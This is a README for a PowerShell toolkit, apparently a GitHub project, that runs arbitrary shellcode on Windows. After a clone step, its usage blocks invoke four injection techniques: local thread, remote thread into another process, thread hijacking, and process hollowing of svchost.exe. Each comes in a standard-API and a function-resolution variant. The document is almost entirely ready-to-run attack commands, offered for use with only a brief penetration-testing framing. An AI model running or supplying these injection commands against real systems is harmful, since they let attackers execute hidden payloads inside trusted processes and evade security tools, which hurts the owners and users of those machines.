# **PowerShell-Shellcode-Exec**

PowerShell is an excellent tool built into Windows. Because of this, we can leverage it against any standard computer with basic knowledge of the .NET framework. Shellcode execution may be a vital aspect to penetration testing and must be accomplished.

There are many ways to get shellcode executed on a device, but I will be going over 2 execution methods and 4 types of shellcode execution.

### **Setup**

```powershell
git clone https://github.com/SilentisVox/PowerShellcode-Shellcode-Exec
cd PowerShellcode-Shellcode-Exec
```

### **Usage**

```powershell
cd "./Standard Windows API"

. "./Local Thread/Invoke-ShellcodeViaLocalThread.ps1"
. "./Remote Thread/Invoke-ShellcodeViaRemoteThread.ps1"
. "./Thread Hijack/Invoke-ShellcodeViaThreadHijack.ps1"
. "./Process Hollow/Invoke-ShellcodeViaProcessHollow.ps1"

Invoke-ShellcodeViaLocalThread -Shellcode $Shellcode -Verbose
Invoke-ShellcodeViaRemoteThread -Shellcode $Shellcode -TargetPID 1234 -Verbose
Invoke-ShellcodeViaThreadHijack -Shellcode $Shellcode -TargetPID 1234 -TargetTID 5678 -Verbose
Invoke-ShellcodeViaProcessHollow -Shellcode $Shellcode -ProcessPath "C:\Windows\System32\svchost.exe" -Verbose
```

```powershell
cd "./Function Resolutions"

. "./Local Thread/Invoke-ShellcodeViaLocalThread.ps1"
. "./Remote Thread/Invoke-ShellcodeViaRemoteThread.ps1"
. "./Thread Hijack/Invoke-ShellcodeViaThreadHijack.ps1"
. "./Process Hollow/Invoke-ShellcodeViaProcessHollow.ps1"

Invoke-ShellcodeViaLocalThread -Shellcode $Shellcode -Verbose
Invoke-ShellcodeViaRemoteThread -Shellcode $Shellcode -TargetPID 1234 -Verbose
Invoke-ShellcodeViaThreadHijack -Shellcode $Shellcode -TargetPID 1234 -TargetTID 5678 -Verbose
Invoke-ShellcodeViaProcessHollow -Shellcode $Shellcode -ProcessPath "C:\Windows\System32\svchost.exe" -Verbose
```

## **Brief Explanation**

![Ghost](assets/Ghost.jpg)
